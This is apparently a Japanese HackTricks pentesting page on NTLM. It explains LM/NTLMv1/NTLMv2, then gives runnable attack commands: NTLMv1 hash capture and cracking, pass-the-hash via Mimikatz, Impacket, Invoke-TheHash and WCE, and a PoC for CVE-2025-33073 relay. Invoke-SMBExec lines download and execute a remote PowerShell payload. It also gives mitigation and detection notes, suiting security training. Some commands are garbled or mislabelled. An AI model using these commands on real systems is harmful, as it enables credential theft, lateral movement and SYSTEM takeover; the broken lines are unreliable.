# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

**Windows XP と Server 2003** が稼働している環境では、LM（Lan Manager）ハッシュが使用されますが、簡単に侵害されることが広く知られています。特定の LM ハッシュ `AAD3B435B51404EEAAD3B435B51404EE` は、LM が使用されていないことを示し、空文字列のハッシュを表します。

デフォルトでは、**Kerberos** 認証プロトコルが主に使用されます。NTLM（NT LAN Manager）は、Active Directory が存在しない、ドメインが存在しない、設定ミスにより Kerberos が機能しない、有効なホスト名ではなく IP アドレスを使って接続しようとした場合など、特定の状況で使用されます。

ネットワークパケットに **「NTLMSSP」** ヘッダーが含まれていれば、NTLM 認証プロセスが行われていることを示します。

認証プロトコル LM、NTLMv1、NTLMv2 は、`%windir%\Windows\System32\msv1\_0.dll` にある特定の DLL によってサポートされています。

**要点**:

- LM ハッシュは脆弱です。空の LM ハッシュ（`AAD3B435B51404EEAAD3B435B51404EE`）は、LM が使用されていないことを示します。
- デフォルトの認証方法は Kerberos で、NTLM は特定の条件下でのみ使用されます。
- NTLM 認証パケットは「NTLMSSP」ヘッダーで識別できます。
- LM、NTLMv1、NTLMv2 プロトコルは、システムファイル `msv1\_0.dll` によってサポートされています。

## LM、NTLMv1、NTLMv2

使用するプロトコルの確認と設定ができます。

### GUI

_secpol.msc_ を実行 -> Local policies -> Security Options -> Network Security: LAN Manager authentication level。レベルは 6 段階（0 から 5）あります。

![LM、NTLMv1、NTLMv2 - GUI: secpol.msc を実行 - Local policies - Security Options - Network Security: LAN Manager authentication level。レベルは 6 段階（0 から 5）あります](<../../images/image (919).png>)

### Registry

これにより、レベル 5 が設定されます。

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

可能な値：

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## 基本的なNTLMドメイン認証スキーム

1. **ユーザー**が**認証情報**を入力する
2. クライアントマシンが**ドメイン名**と**ユーザー名**を含む**認証リクエストを送信する**
3. **サーバー**が**チャレンジ**を送信する
4. **クライアント**がパスワードのハッシュを鍵として**チャレンジを暗号化**し、レスポンスとして送信する
5. **サーバー**は**ドメイン名、ユーザー名、チャレンジ、レスポンス**を**ドメインコントローラー**に送信する。Active Directoryが構成されて**いない**場合、またはドメイン名がサーバー名と同じ場合、認証情報は**ローカルで検証される**。
6. **ドメインコントローラーがすべて正しいかを確認し**、情報をサーバーに送信する

**サーバー**と**ドメインコントローラー**は、Netlogonサーバーを介して**セキュアチャネル**を作成できる。ドメインコントローラーはサーバーのパスワードを知っているため（パスワードは**NTDS.DIT**データベース内にある）。

### ローカルNTLM認証スキーム

認証の仕組みは**前述のものと同じだが**、**サーバー**は認証を試みているユーザーのハッシュを**SAM**ファイル内に保持している。そのため、ドメインコントローラーに問い合わせる代わりに、**サーバー自身が**ユーザーの認証可否を確認する。

### NTLMv1チャレンジ

**チャレンジは8バイト**、レスポンスは**24バイト**の長さである。

**NTハッシュ（16バイト）**を**7バイトずつ3つの部分**に分割する（7B + 7B + (2B+0x00\*5)）。**最後の部分はゼロで埋められる**。次に、各部分を使って**チャレンジ**を個別に**暗号化**し、暗号化された**結果の**バイト列を**連結**する。合計：8B + 8B + 8B = 24バイト。

**問題点**:

- **ランダム性**が不足している
- 3つの部分を個別に**攻撃**してNTハッシュを特定できる
- **DESは解読可能**
- 3番目の鍵は常に**5つのゼロ**で構成される。
- **同じチャレンジ**を使うと、**レスポンス**も**同じ**になる。そのため、被害者に "**1122334455667788**" という文字列を**チャレンジ**として送信させ、事前計算済みのrainbow tableを使ってレスポンスを攻撃できる。

### NTLMv1攻撃

Unconstrained delegationは現代の環境ではあまり一般的ではないが、アクセス可能な**Print Spoolerサービス**を悪用して、そのようなホストへの認証を強制できる場合がある。

AD上ですでに保有している認証情報やセッションを悪用し、**プリンターに、管理下にあるホストへの認証を要求させる**ことができる。その後、`metasploit auxiliary/server/capture/smb` または `responder` を使い、**認証チャレンジを1122334455667788に設定**して認証試行をキャプチャする。認証に**NTLMv1**が使われていれば、**クラックできる**。\
`responder` を使う場合は、認証を**ダウングレード**するためにフラグ `--lm` の使用を試すことができる。\
_この手法では、認証にNTLMv1を使用する必要がある（NTLMv2は使用できない）。_

認証時にプリンターがコンピューターアカウントを使うことを覚えておこう。コンピューターアカウントには**長くランダムなパスワード**が設定されているため、一般的な**辞書**ではおそらくクラックできない。しかし、**NTLMv1**認証では**DES**が使われる（[詳しい情報はこちら](#ntlmv1-challenge)）。そのため、DESのクラックに特化したサービスを利用すればクラックできる（例：[https://crack.sh/](https://crack.sh) または [https://ntlmv1.com/](https://ntlmv1.com)）。

### hashcatを使ったNTLMv1攻撃

NTLMv1は、キャプチャしたNTLMv1メッセージをHashcatに適した形式に変換する[NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi)を使って攻撃することもできる。<sup>[[1]](#references)</sup>

コマンドは、

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

以下のように出力されます：

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

ファイルに書き込む内容と、希望するファイル名を送ってください。

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

hashcatを実行してください（そうしないと数日かかるため、hashtopolisなどのツールを使った分散実行が最適です）。

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

この場合、これのパスワードが password だと分かっているので、デモ用に少しズルをします。

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

ここでは、hashcat-utilitiesを使用して、解読済みのDESキーをNTLMハッシュの一部に変換する必要があります:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

最後の部分です：

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

これらを組み合わせます:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**チャレンジの長さは8バイト**で、**2つのレスポンスが送信されます**。1つは**24バイト**で、**もう1つ**の長さは可変です。

**最初のレスポンス**は、**クライアントとドメイン**で構成される**文字列**を**キー**として**NT hash**の**MD4 hash**を使用し、**HMAC_MD5**で暗号化して作成します。次に、その**結果**を**キー**として、**チャレンジ**を**HMAC_MD5**で暗号化します。これに、8バイトのクライアントチャレンジを追加します。合計: 24 B。

**2つ目のレスポンス**は、**複数の値**（新しいクライアントチャレンジ、**リプレイ攻撃**を防ぐための**タイムスタンプ**など）を使用して作成されます。

**認証に成功した通信を含むPCAP**がある場合は、ドメイン、ユーザー名、サーバーチャレンジ、NTLMv2レスポンスを抽出し、Hashcat用にキャプチャを整形して、モード `5600` を使ってパスワードの復元を試みてください。保存されている実践的な手順ではパケットフィールドの抽出方法が説明されており、Hashcatのサンプルでは現在受け付けられる形式が示されています。<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**被害者のhashを入手したら**、それを使って被害者に**なりすます**ことができます。\
そのhashを使ってNTLM認証を**実行する****ツール**を使用する必要があります。あるいは、新しい**sessionlogon**を作成し、そのhashを**LSASS**に**注入**することもできます。そうすれば、NTLM認証が**実行されるたびに**そのhashが使われます。mimikatzが行うのは後者です。

**Computer accountを使ってもPass-the-Hash攻撃を実行できることを忘れないでください。**

### **Mimikatz**

**管理者として実行する必要があります**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

これは現在のローカルユーザーとしてプロセスを起動し、LSASSは指定された資格情報をアウトバウンドネットワークログオンに関連付けます。これにより、平文パスワードを知らなくても、`runas /netonly`と同様に指定したユーザーとしてネットワークリソースにアクセスできます。

### linuxからのPass-the-Hash

LinuxからPass-the-Hashを使って、Windowsマシン上でコード実行できます。\
[**Impacket PsExecを使ったPass-the-Hashの実行例はこちら。**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### ImpacketのWindowsコンパイル済みツール

[ImpacketのWindows用バイナリはこちらからダウンロードできます](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe**（この場合はコマンドを指定する必要があります。cmd.exeとpowershell.exeは対話型シェルの取得には使えません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Impacketのバイナリはほかにもいくつかあります...

### Invoke-TheHash

PowerShellスクリプトはこちらから入手できます: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

この関数は、前述のモードを組み合わせます。**複数のホスト**を指定し、選択したターゲットを除外して、_SMBExec、WMIExec、SMBClient,_ または _SMBEnum_ を選択できます。_**Command**_ パラメーターを指定せずに **SMBExec** または **WMIExec** を選択した場合、十分な権限があるかどうかだけを確認します。

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールはmimikatzと同じ処理を行います（LSASSメモリを変更します）。

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### ユーザー名とパスワードを使った Windows の手動リモート実行


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows ホストからの認証情報の抽出

詳しくは、[**Windows 認証情報の窃取**](../stealing-credentials/README.md)を参照してください。

## Internal Monologue attack

Internal Monologue Attack は、**LSASS プロセスと直接やり取りすることなく**、攻撃者が被害者のマシンから NTLM ハッシュを取得できる、ステルス性の高い認証情報抽出手法です。メモリからハッシュを直接読み取り、エンドポイントセキュリティソリューションや Credential Guard によって頻繁にブロックされる Mimikatz とは異なり、この攻撃では **Security Support Provider Interface (SSPI) を介した NTLM 認証パッケージ (MSV1_0) へのローカル呼び出し**を利用します。攻撃者はまず、NetNTLMv1 が許可されるように NTLM の設定（LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic など）を**ダウングレード**します。次に、実行中のプロセスから取得した既存のユーザートークンを偽装し、既知のチャレンジを使った NetNTLMv1 レスポンスを生成するため、ローカルで NTLM 認証を実行します。<sup>[[4]](#references)</sup>

これらの NetNTLMv1 レスポンスを取得すると、攻撃者は**事前計算済みのレインボーテーブル**を使って元の NTLM ハッシュをすばやく復元し、ラテラルムーブメントのための Pass-the-Hash 攻撃をさらに実行できます。重要なのは、Internal Monologue Attack がネットワークトラフィックを発生させず、コードをインジェクションせず、直接メモリダンプを実行しないためステルス性を保ち、Mimikatz などの従来の手法と比べて防御側による検知が困難な点です。

セキュリティポリシーによって NetNTLMv1 が強制的に無効化されている場合、攻撃者は NetNTLMv1 レスポンスを取得できない可能性があります。

このケースに対応するため、Internal Monologue ツールは更新されました。`AcceptSecurityContext()` を使ってサーバートークンを動的に取得し、NetNTLMv1 が失敗した場合でも **NetNTLMv2 レスポンスを取得**できるようになっています。NetNTLMv2 のクラックははるかに困難ですが、限定的なケースではリレー攻撃やオフラインの総当たり攻撃につながる可能性があります。

PoC は **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** にあります。<sup>[[4]](#references)</sup>

## NTLM Relay と Responder

**これらの攻撃の実行方法については、こちらの詳細ガイドを参照してください:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## ネットワークキャプチャからの NTLM チャレンジの解析

[**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)を**使用できます**。

## シリアライズされた SPN を介した NTLM と Kerberos の *Reflection* (CVE-2025-33073)

Windows には、ホストから発生した NTLM（または Kerberos）認証を**同じ**ホストに中継して SYSTEM 権限を取得する *Reflection* 攻撃を防ぐための、複数の緩和策が含まれています。  

Microsoft は MS08-068 (SMB→SMB)、MS09-013 (HTTP→SMB)、MS15-076 (DCOM→DCOM) およびその後のパッチによって、公開されていた攻撃チェーンの大半を無効化しました。しかし **CVE-2025-33073** は、*マーシャリングされた*（シリアライズされた）ターゲット情報を含む Service Principal Name (SPN) を **SMB クライアントが切り詰める**仕組みを悪用すれば、保護を依然として回避できることを示しています。<sup>[[5]](#references)[[6]](#references)</sup>

### バグの要約
1. 攻撃者は、マーシャリングされた SPN をラベルに埋め込んだ **DNS A レコード**を登録します。例:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 被害者に、そのホスト名への認証を強制します（PetitPotam、DFSCoerce など）。
3. SMB クライアントがターゲット文字列 `cifs/srv11UWhRCAAAAA…` を `lsasrv!LsapCheckMarshalledTargetInfo` に渡すと、`CredUnmarshalTargetInfo` の呼び出しによってシリアライズされた blob が**取り除かれ**、**`cifs/srv1`** が残ります。
4. `msv1_0!SspIsTargetLocalhost`（または Kerberos の同等機能）は、ホスト名の短縮部分がコンピューター名 (`SRV1`) と一致するため、ターゲットを *localhost* と見なします。
5. その結果、サーバーは `NTLMSSP_NEGOTIATE_LOCAL_CALL` を設定し、コンテキストに **LSASS の SYSTEM アクセストークン**を注入します（Kerberos の場合は SYSTEM とマークされたサブセッションキーが作成されます）。
6. `ntlmrelayx.py` **または** `krbrelayx.py` でこの認証をリレーすると、同じホスト上で完全な SYSTEM 権限を取得できます。<sup>[[5]](#references)</sup>

### 簡易 PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### パッチと緩和策
* **CVE-2025-33073** の KB パッチは、`mrxsmb.sys::SmbCeCreateSrvCall` にチェックを追加し、ターゲットにマーシャリングされた情報が含まれる（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）SMB 接続をブロックします。<sup>[[5]](#references)[[6]](#references)</sup>
* SMB relay の宛先では **SMB signing** を強制してください。それ以外の宛先では、そのプロトコル独自の署名または Extended Protection の要件とパッチレベルを確認してください。SMB signing だけでは、HTTPS WinRM relay が可能かどうかは判断できません。
* `*<base64>...*` のような DNS レコードを監視し、強制認証のベクトル（PetitPotam、DFSCoerce、AuthIP...）をブロックしてください。

### 検知のアイデア
* クライアント IP とサーバー IP が異なる `NTLMSSP_NEGOTIATE_LOCAL_CALL` を含むネットワークキャプチャ。
* サブセッションキーを含み、クライアントプリンシパルがホスト名と一致する Kerberos AP-REQ。
* Windows Event 4624/4648 の SYSTEM ログオン直後に、同じホストからリモート SMB 書き込みが発生するケース。<sup>[[5]](#references)</sup>

シリアライズされたターゲット情報を含む DNS 名は、強制認証を攻撃者へ誘導し、AD CS の Web 登録エンドポイントへの **cross-protocol relay** を実行するためにも利用できます。これは same-host reflection とは別の結果です。[ESC8 の登録条件](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)、DNS 書き込み権限、強制認証の経路、およびターゲットのパッチレベルを個別に評価する必要があります。

**SMB arbitrary ports** と **TCP connection reuse** を悪用して `NT AUTHORITY\SYSTEM` に到達する **2026 年 3 月** のローカル reflection variant については、以下を参照してください。

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 マルチツール](https://github.com/evilmog/ntlmv1-multi)
- [2] [NetNTLMv2 のハッシュ例（mode 5600）](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash ユーティリティ](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS に触れずに NTLM ハッシュを取得する](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection は死んだ、NTLM Reflection 万歳！](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 ハッシュのクラッキング – 801Labs（Internet Archive）](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
